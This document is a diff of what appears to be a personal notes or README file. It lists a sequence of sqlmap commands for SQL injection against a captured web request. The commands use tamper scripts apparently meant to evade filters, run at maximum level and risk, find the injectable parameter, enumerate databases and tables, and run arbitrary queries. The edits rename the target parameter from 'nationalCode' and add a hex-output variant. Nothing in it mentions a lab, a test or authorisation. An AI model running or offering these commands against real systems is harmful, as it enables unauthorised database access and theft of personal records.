@@ -10,10 +10,12 @@ sqlmap -r Hi.txt -p nationalCode --tamper="between,randomcase,space2comment" --l
 
 _______________________________________________________________________________________________________________________________________________
 
-if you just want to find the vulnerability parameter use this command : sqlmap -r Hi.txt --tamper="between,randomcase,space2comment" --level 5 --risk 3 --technique=BEUST
+If you just want to find the vulnerability parameter use this command : sqlmap -r Hi.txt --tamper="between,randomcase,space2comment" --level 5 --risk 3 --technique=BEUST
 
 Then for gathering database : sqlmap -r Hi.txt --tamper="between,randomcase,space2comment" --level 5 --risk 3 --technique=BEUST --dbs
 
-now lets find the vulnerability database use this command : sqlmap -r hi.txt -p nationalCode --tamper="between,randomcase,space2comment" --level 5 --risk 3 --technique=BEUST  --sql-query "SELECT * FROM TABLE;"
+Now lets find the vulnerability database use this command : sqlmap -r hi.txt -p HI --tamper="between,randomcase,space2comment" --level 5 --risk 3 --technique=BEUST  --sql-query "SELECT * FROM TABLE;"
 
-afte finding the best database use this : sqlmap -r Hi.txt -p nationalCode --tamper="between,randomcase,space2comment" --level 5 --risk 3 --technique=BEUST -D HI --tables
+Afte finding the best database use this : sqlmap -r Hi.txt -p HI --tamper="between,randomcase,space2comment" --level 5 --risk 3 --technique=BEUST -D HI --tables
+
+Or sqlmap -r Hi.txt -p HI --tamper="between,randomcase,space2comment" --level 5 --risk 3 --technique=BEUST -D HI --tables --hex
